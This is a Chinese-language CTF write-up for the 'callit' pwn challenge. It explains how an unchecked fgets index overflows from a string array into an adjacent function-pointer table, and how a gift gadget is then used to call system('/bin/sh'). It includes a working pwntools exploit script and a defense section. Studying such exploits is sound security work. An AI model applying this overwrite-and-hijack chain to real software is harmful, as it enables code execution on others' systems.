---
id: ctf-pwn-adjacent-talks-gestures-function-pointer-overflow-gift
title: 相邻 talks/gestures 数组 + 16 字节 fgets 溢出覆写函数指针表，借 gift gadget 调 system
type: scenario
domain: ctf
path: ctf/pwn
technique: adjacent-talks-gestures-function-pointer-overflow-gift
aliases:
- callit
- gestures 函数指针数组
- talks 溢出
- fgets 16 字节越界
- gift gadget
- 相邻数组覆写函数指针
tags:
- pwn
- function-pointer
- out-of-bounds-write
- fgets
- array-adjacency
- gift-gadget
- system
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:10+08:00'
  notes: 已对照原文 program/execute/gift 汇编与 EXP 核对；talks/gestures 相邻布局与索引不同步成立；PoC 未复跑。
---

## 一句话结论

程序把 8 个函数指针 `gestures[]` 与 8 个 16 字节字符串 `talks[]` 相邻放在 BSS，循环用 `fgets(&talks[16*v2], 16, stdin)` 写字符串，但 `v2` 在无效菜单选项时也会自增、`n_gestures` 只统计有效手势；攻击者用无效选项把 `v2` 推过 7，让 `fgets` 从 `talks` 越界写进 `gestures`，把 `gestures[0]` 改为 `gift` gadget、`gestures[1]` 改为 `/bin/sh` 地址、`gestures[2]` 改为 `system@plt`，执行时 `gift` 以 `gestures` 为参数调用 `system("/bin/sh")`。

## 原理

- **布局**：`talks` 是 8×16 字节的字符串数组，`gestures` 是 8 个函数指针数组，二者在 BSS 相邻；`talks` 起始地址为 `0x404060`，`talks+0x80` 即 `gestures` 起始。
- **索引不同步**：`program()` 中 `v2` 每轮循环都自增，但只有选择 1–5 时才 `++n_gestures` 并写 `gestures[v2]`；选择 0 退出，其他值走 `default` 只打印提示，然后仍然 `++v2`。因此 `v2` 可以远大于 7，而 `n_gestures` 仍很小。
- **越界写**：`fgets(&talks[16*v2], 16, stdin)` 只按 `v2` 计算字符串地址，没有检查 `v2 < 8`。当 `v2 = 8` 时写入 `talks+0x80 = gestures[0]`；`v2 = 9` 时写入 `gestures[2]`。每次最多 16 字节，正好覆盖两个函数指针。
- **执行**：`execute(p_gestures)` 循环 `n_gestures` 次，调用 `(*(void (**)(void))(8*i + p_gestures))()`，然后打印 `talks[16*i]`。调用前 `rdi` 仍是 `p_gestures`（`lea rax, gestures; mov rdi, rax; call execute`，之后未改），所以被调用的函数能拿到 `gestures` 数组地址。
- **gift gadget**：`gift` 的汇编是 `mov rax, rdi; mov rdi, [rax+8]; call qword ptr [rax+0x10]; ret`。传入 `rdi = gestures` 时，它把 `gestures[1]` 当作第一个参数、`gestures[2]` 当作函数指针调用；因此把 `gestures[1]` 设为 `talks`（内容 `/bin/sh`）、`gestures[2]` 设为 `system@plt`，就等价于 `system("/bin/sh")`。
- **为什么选择 7 次无效选项**：第一次合法手势把 `/bin/sh` 写进 `talks[0]`，`v2=1`；再连续 7 次选 `6`（default 分支）把 `v2` 推到 8；第 8 次选合法手势 1，`fgets` 写到 `talks+0x80`，覆盖 `gestures[0..1]`；第 9 次选合法手势 1，`fgets` 写到 `talks+0x90`，覆盖 `gestures[2..3]`。`n_gestures` 此时为 3，`execute` 调用 `gestures[0]` 即 `gift`。
- 根因是“字符串数组下标 `v2` 与函数指针数组的语义索引 `n_gestures` 不一致”，以及相邻数组之间没有边界检查；`fgets` 的 16 字节长度让每次能精确覆盖两个指针。

## 触发条件

- 程序把字符串数组与函数指针数组相邻布局，且字符串写入索引可超过字符串数组容量。
- 写入函数（`fgets`/`read`/`strcpy`）的长度足以覆盖到函数指针数组，且攻击者能控制写入内容。
- 函数指针数组会被逐个调用，且调用时某个寄存器（本例 `rdi`）仍指向数组基址或可控结构。
- 存在可用的 pivot/gift gadget（如 `mov rax,rdi; mov rdi,[rax+8]; call [rax+0x10]`）或可直接写 `system@plt` 的位置。
- 二进制无 PIE 或地址可泄露，`system@plt`/`/bin/sh` 地址可确定。

## 利用步骤

1. 逆向 `program()`/`execute()`，确认 `talks` 与 `gestures` 的地址、`v2` 与 `n_gestures` 的更新逻辑、函数调用时的寄存器状态。
2. 第一次选择合法手势并在 “What should I say” 输入 `/bin/sh`，写入 `talks[0]`。
3. 连续选择无效选项（如 `6`）7 次，让 `v2` 从 1 增到 8，而 `n_gestures` 保持不变。
4. 第 8 次选择合法手势，在字符串输入中写入 15 字节 payload：`p64(gift) + p64(talks)[:-1]`，覆盖 `gestures[0]=gift`、`gestures[1]=talks`。
5. 第 9 次选择合法手势，在字符串输入中写入 `p64(system_plt)`，覆盖 `gestures[2]=system@plt`；此时 `n_gestures=3`。
6. 选择 `0` 结束输入，`execute` 调用 `gestures[0]=gift`：`rdi` 指向 `gestures`，`gift` 取 `gestures[1]=talks`（`/bin/sh`）和 `gestures[2]=system`，执行 `system("/bin/sh")`。

## PoC

```python
from pwn import *

p = process("./callit")
context(log_level="debug")

# talks[0] = "/bin/sh"
p.sendlineafter("Choose your gesture: ", "1")
p.sendlineafter("What should I say after this gesture? ", "/bin/sh")

# 7 次无效选项，把 v2 推到 8（n_gestures 仍为 1）
for _ in range(7):
    p.sendlineafter("Choose your gesture: ", "6")

# v2=8: 写 talks+0x80 = gestures[0..1]
p.sendlineafter("Choose your gesture: ", "1")
p.sendlineafter("What should I say after this gesture? ",
                p64(0x401231) + p64(0x404060)[:-1])  # gift, talks

# v2=9: 写 talks+0x90 = gestures[2..3]
p.sendlineafter("Choose your gesture: ", "1")
p.sendlineafter("What should I say after this gesture? ", p64(0x401228))  # system@plt

p.sendlineafter("Choose your gesture: ", "0")
p.interactive()
```

## 变体与关联

- 变体：字符串数组在前、函数指针数组在后时向高地址溢出；反过来可向低地址溢出覆盖其他全局表。`fgets` 长度换成 `read`/`strcpy`/`memcpy` 时，按可写字节数调整覆盖步长。
- 变体：没有 `gift` 这类 pivot gadget 时，可把 `gestures[0]` 直接写成 `system@plt`，并把 `talks[0]` 放到 `rdi` 指向的位置，或先泄漏 PIE 再用 ROP。
- 变体：`v2`/`n_gestures` 不同步是核心；类似“显示用索引与写入用索引分离”“负数/溢出索引”都可造成相邻数组越界。
- 关联：[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（负数索引数组越界）、[[binary-pwn-stack-ret2libc]]（system/plt 调用基础）、[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（相邻全局数组/结构体越界写）。
- 边界：`v2` 有上限检查、`talks`/`gestures` 之间有 padding/guard、`fgets` 使用 `sizeof(talks[0])` 且索引受 `n_gestures` 约束、或函数调用前清空 `rdi` 时，本链失效。

## 检测与防御

- 用同一个受检索引控制字符串数组和函数指针数组；每次写入前检查 `0 <= v2 < 8`，或把 `v2` 与 `n_gestures` 合并为一个状态。
- 字符串数组与函数指针数组分开布局，中间加 guard/padding；`fgets` 使用元素大小并确保不跨元素。
- 函数指针表放只读段（Full RELRO），调用前校验指针落在合法函数地址范围；开启 PIE/Canary/CET。
- 检测：菜单中出现大量无效选项导致索引快速增长；`talks` 区域出现 8 字节指针样式；`gestures` 表项被改到非代码段地址；`system`/`/bin/sh` 调用或 shell 子进程。
